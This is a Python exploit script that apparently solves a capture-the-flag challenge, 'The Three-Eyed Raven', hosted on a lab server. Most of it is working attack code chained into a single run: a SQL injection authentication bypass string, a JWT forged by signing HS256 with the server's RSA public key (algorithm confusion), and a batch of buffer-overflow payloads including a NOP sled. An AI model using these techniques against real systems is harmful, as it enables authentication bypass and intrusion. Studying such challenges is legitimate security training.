#!/usr/bin/env python3
"""
The Three-Eyed Raven - Refined Solution
Iron token works: ' OR '1'='1
Need to fix Face JWT and find Dragon breath
"""

import socket
import time
import base64
import json
import hmac
import hashlib

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def get_fresh_public_key():
    """Get a fresh public key from the service"""
    s = connect_to_raven()
    
    s.sendall(b"guest\n")
    time.sleep(0.5)
    response = s.recv(4096).decode('utf-8', errors='ignore')
    
    # Extract public key
    if "-----BEGIN PUBLIC KEY-----" in response:
        start = response.index("-----BEGIN PUBLIC KEY-----")
        end = response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
        public_key = response[start:end]
        s.close()
        return public_key
    
    s.close()
    return None

def create_correct_face_jwt():
    """Create Face JWT with correct HMAC signature"""
    print("[+] Creating correct Face JWT...")
    
    # Get fresh public key
    public_key = get_fresh_public_key()
    if not public_key:
        print("[-] Failed to get public key")
        return None
    
    print(f"[+] Got public key:\n{public_key}")
    
    # Use the public key as HMAC secret (with trailing newline)
    key = (public_key + '\n').encode()
    
    # Create JWT with HS256 and name="many-faced"
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"name": "many-faced", "iat": int(time.time())}
    
    # Encode header and payload
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    # Create signature
    signing_input = h + b'.' + p
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
    
    # Combine into JWT
    face_jwt = (signing_input + b'.' + sig_b64).decode()
    
    return face_jwt

def create_dragon_breath_payloads():
    """Create various dragon breath payloads for buffer overflow"""
    print("[+] Creating dragon breath payloads...")
    
    # Based on Dragonstone Vault, we need buffer overflow payloads
    # The weirwood binary likely has a buffer overflow vulnerability
    
    payloads = []
    
    # Simple overflow patterns
    for size in [64, 100, 128, 256, 512, 1024]:
        payloads.append(b"A" * size)
    
    # Pattern-based overflows
    payloads.extend([
        b"AAAA" + b"BBBB" * 10,
        b"A" * 88 + b"BBBBBBBB",  # Common buffer + return address
        b"A" * 96 + b"CCCCCCCC",  # Another common pattern
        b"A" * 104 + b"DDDDDDDD", # Yet another
    ])
    
    # Dragon-themed overflows
    dragon_base = b"dracarys"
    for size in [50, 100, 200]:
        payloads.append(dragon_base + b"A" * size)
    
    # Flag-themed overflows
    flag_base = b"fire_and_blood_dracarys"
    for size in [50, 100, 200]:
        payloads.append(flag_base + b"A" * size)
    
    # Specific patterns that might trigger something
    payloads.extend([
        b"\x90" * 100,  # NOP sled
        b"\x41" * 100 + b"\x42" * 8 + b"\x43" * 8,  # Pattern
        b"Drogon" + b"A" * 100,
        b"Rhaegal" + b"A" * 100, 
        b"Viserion" + b"A" * 100,
        b"SpaceCTF{fire_and_blood_dracarys_" + b"A" * 100,
    ])
    
    # Convert to base64
    b64_payloads = []
    for payload in payloads:
        b64_payloads.append(base64.b64encode(payload).decode())
    
    return b64_payloads

def test_complete_solution():
    """Test the complete solution with all three tokens"""
    print("[+] Testing complete Three-Eyed Raven solution...")
    
    # Known working iron token
    iron_token = "' OR '1'='1"
    
    # Create face JWT
    face_jwt = create_correct_face_jwt()
    if not face_jwt:
        return False
    
    # Create dragon payloads
    dragon_payloads = create_dragon_breath_payloads()
    
    try:
        s = connect_to_raven()
        
        # Step 1: Offer iron token
        print(f"[+] Step 1: Offering iron token: {iron_token}")
        s.sendall(f"offer iron {iron_token}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Iron response: {response.strip()}")
        
        if "accepted" not in response.lower():
            print("[-] Iron token not accepted")
            s.close()
            return False
        
        # Step 2: Offer face JWT
        print(f"[+] Step 2: Offering face JWT...")
        s.sendall(f"offer face {face_jwt}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Face response: {response.strip()}")
        
        # Check status after face
        s.sendall(b"status\n")
        time.sleep(0.5)
        status = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Status after face: {status}")
        
        face_accepted = "face   : accepted" in status
        
        # Step 3: Try dragon payloads
        print(f"[+] Step 3: Trying {len(dragon_payloads)} dragon payloads...")
        
        for i, dragon_payload in enumerate(dragon_payloads):
            print(f"[+] Testing dragon payload {i+1}/{len(dragon_payloads)}")
            
            s.sendall(f"offer dragon {dragon_payload}\n".encode())
            time.sleep(1)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            if "SpaceCTF{" in response:
                print(f"\n🎉 FLAG FOUND: {response}")
                s.close()
                return True
            
            if "accepted" in response.lower() or "turns away" not in response:
                print(f"Dragon response {i+1}: {response.strip()}")
                
                # Check status
                s.sendall(b"status\n")
                time.sleep(0.5)
                status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Status: {status}")
                
                if "SpaceCTF{" in status:
                    print(f"\n🎉 FLAG FOUND: {status}")
                    s.close()
                    return True
                
                if "dragon : accepted" in status:
                    print("[!] Dragon payload accepted!")
                    
                    # All three accepted - check for flag
                    if "iron   : accepted" in status and "face   : accepted" in status:
                        print("[!] All three offerings accepted!")
                        
                        # Try various commands to get flag
                        for cmd in ["status", "help", "quit", ""]:
                            s.sendall(f"{cmd}\n".encode())
                            time.sleep(0.5)
                            resp = s.recv(4096).decode('utf-8', errors='ignore')
                            
                            if "SpaceCTF{" in resp:
                                print(f"\n🎉 FLAG FOUND: {resp}")
                                s.close()
                                return True
        
        s.close()
        
    except Exception as e:
        print(f"Error in complete solution: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - REFINED SOLUTION")
    print("="*70)
    
    if test_complete_solution():
        print("\n🎉 Challenge completed successfully!")
    else:
        print("\n❌ Challenge not completed - need more work")

if __name__ == "__main__":
    main()